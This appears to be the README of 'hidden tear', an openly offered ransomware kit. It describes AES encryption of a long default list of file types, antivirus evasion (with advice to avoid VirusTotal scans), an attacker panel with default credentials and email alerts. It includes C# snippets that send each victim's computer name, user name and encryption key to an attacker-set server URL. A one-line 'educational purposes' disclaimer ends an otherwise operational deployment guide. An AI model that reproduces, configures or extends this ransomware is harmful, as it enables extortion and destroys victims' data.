         _     _     _     _              _                  
        | |   (_)   | |   | |            | |                 
        | |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
        | '_ \| |/ _` |/ _` |/ _ \ '_ \  | __/ _ \/ _` | '__|
        | | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
        |_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|   
                                                     
It's a ransomware-like file crypter sample which can be modified for specific purposes. 

**Features**
* Uses AES algorithm to encrypt files.
* Sends encryption key to a server.
* Encrypted files can be decrypt in decrypter program with encryption key.
* Creates a text file in Desktop with given message.
* Small file size (12 KB)
* Doesn't detected to antivirus programs (15/08/2015) http://nodistribute.com/result/6a4jDwi83Fzt - Do not scan with virus total or similar
* This project was updated by Virgula0 and coded by Uktu Sen 
- New features:
* A new advanced server script was added that saves data into database
* All informations are sent if there is an internet connection and the ransomware wait for it if there isn't.
* You can see all target information with Server Attacker panel
* Script can also send you an email with datas
* It can encrypt also exe files and it doesn't get collisions with other processes now
* It encrypt now a lot of files with a lot of extensions more and changing desktop icon with information about hacking attack
* Hidden Tear decryptor now advise if files have been decrypted or not.
* Hidden Tear Decryptor now is able to decrypt the same directories of hidden-tear ransomware.
* Hidden tear change default windows icon of desktop if decrypted is succesfully finished.
* A bug that could delete a part of passcode while sending has been removed.

***************************************************************************************************************************
* If you want , you can send some BTC for this re-work and support me, thank you!
* Address: 1HfwYmCDiHYRxzcbpDf7vSKfv8g9Y1MgpW	| Or you can scan qr code named donation_btc_address.png in the main path *
* Paypal: https://paypal.me/Virgula
* Ethereum 0x25119edFC9aA4D5beb40F24f5A759c4CA0263A54
* Bitcoin Cash: qzmd7kn87q5dkmkzalwu6pct82e68skzksxdfxxd0a
* Thank You!																											  *
***************************************************************************************************************************

**Demonstration Video**

https://www.youtube.com/watch?v=0IvD9Sky9as

Warning: in that video wasn't shown the attacker panel but only the key saved into the file to make the video lasts less.

**Usage**

* You need to have a web server which supports php scripting language. Change this line with your URL. (You better use Https connection to avoid eavesdropping)

  `string targetURL = "https://www.example.com/Server/write.php";`

  * Default Username and password for webpanel (in check.php file) are -> Username: test | Password: test
  * Import sql table in your database importing the file: import.sql
  * Set you database credetials in the file: connect_db.php
  * If you want also write a file for every virus execution go to file: write.php and uncomment from the line 37 to 43. For privacy of information this is not recommended
  * Set your email to get information also by email (don't write your PERSONAL email) in line  47 of file write.php

* The script should writes the GET parameter into a database and if you want into a text file. Sending process running in `SendPassword()` function

  ```
        string info = "?computer_name=" + computerName + "&userName=" + userName + "&password=" + password + "&allow=ransom";
        var fullUrl = targetURL + info;
        var conent = new System.Net.WebClient().DownloadString(fullUrl);
  
  ```
* Target file extensions can be change. Default list:
```
var validExtensions = new[]{".txt", ".jar", ".exe", ".dat", ".contact" , ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".py", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd" , ".pdf" , ".dll" , ".c" , ".cs", ".mp3" , ".mp4", ".f3d" , ".dwg" , ".cpp" , ".zip" , ".rar" , ".mov" , ".rtf" , ".bmp" , ".mkv" , ".avi" , ".apk" , ".lnk" , ".iso", ".7-zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mp3", ".mpg", ".core", ".crproj" , ".pdb", ".ico" , ".pas" , ".db" ,  ".torrent" };
```

* PLEASE DON'T ADD .INI EXTENSION BECAUSE THE CONFILCT WITH THIS FILES WILL CRASH YOUR SCRIPT
* In this new re-upload there is a function that wait for internet connection before to send password to the database:

	    ```
        //check for internet connection
        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                {
                    using (var stream = client.OpenRead("https://www.google.com"))
                    {
                        return true;
                    }
                }
            }
            catch
            {
                return false;
            }
        }
		```

**Legal Warning** 

While this may be helpful for some, there are significant risks. hidden tear may be used only for Educational Purposes. Do not use it as a ransomware! You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
